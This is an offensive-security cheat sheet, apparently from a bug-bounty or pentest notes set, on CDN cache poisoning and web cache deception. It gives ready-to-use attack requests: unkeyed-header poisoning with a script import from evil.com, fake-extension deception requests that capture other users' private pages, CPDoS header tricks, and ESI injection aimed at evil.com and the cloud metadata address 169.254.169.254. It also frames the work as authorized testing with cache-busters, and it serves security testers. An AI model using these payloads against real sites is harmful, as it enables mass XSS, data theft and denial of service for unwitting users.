# CDN / Cache Poisoning & Deception (Deep)

**What it is:** Manipulate what the shared cache (CDN/Varnish/nginx cache/Cloudflare/Akamai/Fastly) stores and serves to *other* users. Unkeyed input in → harmful response cached → mass victims.

## Cache-key concept
Cache key = usually method + host + path + (some) query. Anything **outside** the key but reflected in the response = poison vector. Find the unkeyed inputs.

## 1. Unkeyed header poisoning
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
```
Response reflects `evil.com` into a canonical/script/redirect URL, cached under `/` → every visitor loads attacker resources.
Common unkeyed headers to fuzz:
```
X-Forwarded-Host  X-Host  X-Forwarded-Scheme  X-Forwarded-Proto
X-Original-URL  X-Rewrite-URL  X-Forwarded-Server  X-Forwarded-Port
X-Forwarded-For  Forwarded  X-Http-Method-Override
```
Detect with Burp **Param Miner** → "Guess headers".

## 2. Unkeyed query / fat-GET / cache-key normalization
- Query param reflected but not in key: `?utm=<payload>` cached globally.
- Key normalization gaps: `//`, `/%2F`, case, `?`, `;`, encoded chars treated same by key but different by origin.
- Fat GET: body on a GET the cache ignores but origin reads.
```http
GET /?cb=1 HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com"><script>import('//evil.com/x.js')</script>
```

## 3. Cache poisoning → stored XSS / redirect / DoS
- Reflect payload into cached HTML → persistent XSS for all.
- Poison a redirect header → mass open-redirect/phishing.
- Poison an oversized/error response → cache a 400/500 for a key = DoS (cache-poisoned DoS, "CPDoS"): `X-Metachar`, oversized header, `X-HTTP-Method-Override`.

### CPDoS variants
```
HTTP Header Oversize (HHO):   send header > origin limit, cache stores 400
HTTP Meta Character (HMC):    \n \r in header → origin 400, cached
HTTP Method Override (HMO):   X-HTTP-Method-Override: DELETE → cached error
```

## 4. Web cache deception (steal private pages)
Append a fake static extension so the CDN caches an authenticated page:
```http
GET /account/profile/nonexistent.css HTTP/1.1
Host: target.com
Cookie: session=<victim>
```
Origin serves profile (ignores suffix), CDN caches it as `.css` (static rule) → attacker requests same URL with no cookie → gets victim's profile.
Variants: `;.js`, `%0A.css`, `/%2e%2e/x.css`, `?.css`, path-param `/profile;foo.css`.

## 5. Scoped-cache / key-confusion across tenants
Multi-tenant CDN keyed on path only, not host/tenant → serve tenant A's cached page to tenant B.

## 6. ESI injection (edge-side includes)
If the edge processes ESI:
```http
GET / HTTP/1.1
Host: target.com
Surrogate-Control: ...

<esi:include src="http://evil.com/"/>     (if reflected)
<esi:include src="http://169.254.169.254/"/>   → SSRF at edge
```
→ SSRF from the CDN node, cookie exfil, XSS.

## Detection workflow
- [ ] Add a cache-buster (`?cb=rand`) so you never poison real users while probing.
- [ ] Send a candidate unkeyed input with a marker; check if it reflects.
- [ ] Confirm the response is cached (`X-Cache: HIT`, `Age`, `CF-Cache-Status: HIT`).
- [ ] Verify a **second, clean** request (no header) receives the poisoned response → real.
- [ ] Only then, for the report, show it on a shared key.

## Tools
Burp **Param Miner**, `web-cache-vulnerability-scanner` (wcvs), manual, Collaborator.

## Impact
Mass stored XSS, mass redirect/phishing, private-data theft (deception), DoS. High/critical.

## Deep cuts — key internals, CDN specifics, and richer targets
- [ ] **Cache-key normalization per CDN:** Cloudflare/Fastly/Akamai/CloudFront each normalize `//`, `%2f`, case, `;`, trailing `?`, and default-port differently than the origin → find a variant that's the *same key* but a *different origin response* (or vice-versa) and poison/collide.
- [ ] **`Vary` abuse:** too-narrow `Vary` (no `Origin`/`Accept-Encoding`/`Accept-Language`) lets a request with a poisoned varying header be served to users who didn't send it; too-broad `Vary` can be a cache-busting DoS.
- [ ] **Cookie / auth in cache:** an authed response accidentally cacheable (missing `Cache-Control: private/no-store`) → session/PII served to others; or a `Set-Cookie` gets cached and pinned onto every client (session fixation for all).
- [ ] **Poison something valuable (repeat, prioritized):** cached **redirect** (`Location`), **CORS** `ACAO`, **CSP** removal/`nonce`, **`Set-Cookie`**, **reflected XSS**, and **CPDoS** (HHO/HMC/HMO cached errors).
- [ ] **Cache-deception delimiter matrix (per CDN):** `.css`/`.js` suffix, `;name.css`, `%2f`, `%00`, `%0a`, `%23`, `?`, path-param `;`, double-extension, and OpenLiteSpeed/`/x/..%2f` — confirm the *private* page was cached (`Age`/`X-Cache: HIT`) from a fresh, cookieless client.
- [ ] **Edge compute / ESI / SSI:** `<esi:include src=http://169.254.169.254>` (SSRF at the edge node), `<esi:include src=http://collab>` reflected, Surrogate-Control abuse, Cloudflare Workers/Fastly VCL logic flaws.
- [ ] **`stale-while-revalidate` / `stale-if-error`:** widen the poison window; force an error so a stale poisoned copy is served.
- [ ] **Scope-key confusion across tenants** (path-only key on a multi-tenant CDN, `01-access-control/05`).

## Report notes
Prove the poisoned/deceptive response is served to a *different* client than the one that set it. Always use cache-busters while testing to avoid harming real users. Name the CDN, the unkeyed input/delimiter, and the cached artifact.
